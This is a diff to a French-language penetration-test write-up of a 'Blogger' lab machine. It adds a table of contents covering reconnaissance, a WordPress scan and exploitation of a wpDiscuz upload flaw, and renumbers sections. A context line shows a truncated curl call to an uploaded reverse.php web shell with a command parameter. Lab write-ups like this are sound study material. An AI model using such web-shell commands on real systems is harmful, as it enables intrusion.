@@ -1,5 +1,45 @@
 # 📌 Rapport de Vulnérabilité - Blogger
 
+## 📖 Sommaire
+
+1. [📝 Introduction](#-introduction)
+   - 🎯 Objectif
+   - 🌍 Informations sur l'Environnement
+
+2. [🔍 Découverte du Réseau](#-1-découverte-du-réseau)
+   - 🔎 Scan du Réseau Local
+
+3. [🚀 Analyse des Ports et Services](#-2-analyse-des-ports-et-services)
+   - 🛠 Scan Nmap
+
+4. [🌐 Exploration du Site Web](#-3-exploration-du-site-web)
+   - 🖥 Accès au Site Web
+   - 📂 Recherche de Contenus Cachés avec Dirb
+   - 🛠 Ajout d'une Entrée dans le Fichier Hosts
+
+5. [🔥 Scan de Vulnérabilités WordPress](#-4-scan-de-vulnérabilités-wordpress)
+   - 🏴 Utilisation de WPScan
+
+6. [🔴 Vulnérabilités Critiques](#-vulnérabilités-critiques)
+7. [⚠️ Vulnérabilités Élevées](#-vulnérabilités-élevées)
+8. [🟠 Vulnérabilités Moyennes](#-vulnérabilités-moyennes)
+9. [🟡 Vulnérabilités Faibles](#-vulnérabilités-faibles)
+
+10. [🚀 Exploitation de la Faille Critique wpDiscuz](#-5-exploitation-de-la-faille-critique-wpdiscuz)
+    - 🎯 Exploitation de la Vulnérabilité d’Upload de Fichier
+    - 📂 Étape 1 : Création du Fichier Malveillant
+    - ⏳ Étape 2 : Lancement d’une Écoute sur Kali
+    - 📤 Étape 3 : Upload du Fichier Malveillant
+    - 🎉 Étape 4 : Prise de Contrôle
+
+11. [⚠️ Exploitation Potentielle et Risques](#-5-exploitation-potentielle-et-risques)
+    - 🔑 Vulnérabilités Identifiées
+    - 🚨 Risques et Conséquences
+
+12. [🛡️ Recommandations de Sécurité](#-6-recommandations-de-sécurité)
+
+---
+
 ## 📝 Introduction
 
 ### 🎯 Objectif
@@ -192,7 +232,7 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 
 ---
 
-## ⚠️ 5. Exploitation Potentielle et Risques
+## ⚠️ 6. Exploitation Potentielle et Risques
 
 ### 🔑 Vulnérabilités Identifiées
 1. **WordPress obsolète** : Potentiel XSS et SQL Injection.
@@ -206,7 +246,7 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 
 ---
 
-## 🛡️ 6. Recommandations de Sécurité
+## 🛡️ 7. Recommandations de Sécurité
 
 1. **Mettre à jour WordPress et ses plugins** pour combler les failles connues.
 2. **Restreindre l'accès au SSH** en limitant les connexions aux adresses IP de confiance.
